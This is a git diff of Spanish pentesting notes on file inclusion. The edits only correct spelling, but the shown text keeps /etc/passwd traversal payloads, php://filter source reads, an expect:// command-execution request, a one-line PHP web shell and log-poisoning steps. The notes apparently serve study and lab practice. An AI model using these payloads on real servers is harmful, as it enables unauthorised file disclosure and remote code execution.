@@ -20,13 +20,13 @@ non_existing_dir/../../../etc/passwd/./././././ ... (repetido muchas veces)
 En PHP <5.5, %00 termina la cadena por ende podriamos hacer ../../etc/passwd%00 para eliminar el .php
 
 ## PHP filters
-Si leemos un archivo como config.php probablemente no podamos ver el codigo fuente puesto que lo renderizara asi que podemos hacer la peticion del codigo fuente en base 64 para que no lo renderice y luego decodificarlo para ver el codgio fuente : 
+Si leemos un archivo como config.php probablemente no podamos ver el código fuente puesto que lo renderizara así que podemos hacer la petición del código fuente en base 64 para que no lo renderice y luego decodificarlo para ver el códgio fuente : 
 ```
 caca?caca=php://filter/read=convert.base64-encode/resource=config
 ```
 ## RCE Wrappers
 
- 1.Verificar allow_url_include leyendolo de php.ini . Ejemplo:
+ 1.Verificar allow_url_include leyéndolo de php.ini . Ejemplo:
  ```
  php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
 ```
@@ -57,7 +57,7 @@ curl "http://<SERVER>/index.php?language=expect://id"
 es raro que deje puesto que no se suele usar este wrapper
 ## RCE RFI
 
-Baicamente metes en el campo vulnerable un servidor que estes levantando tu con una revers shell 
+Básicamente metes en el campo vulnerable un servidor que estes levantando tu con una revers shell 
 1.Crear shell 
 ```
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
@@ -148,4 +148,4 @@ Primero de todo vemos donde guarda la web los logs , en este caso los guarda en 
 
 Luego vemos que encabezado de nuestra request es el que guarda en los logs para inyectarle la shell
 
-Por ultimo voolvemos a entrar a los logs para que la shell se ejecute
+Por ultimo volvemos a entrar a los logs para que la shell se ejecute
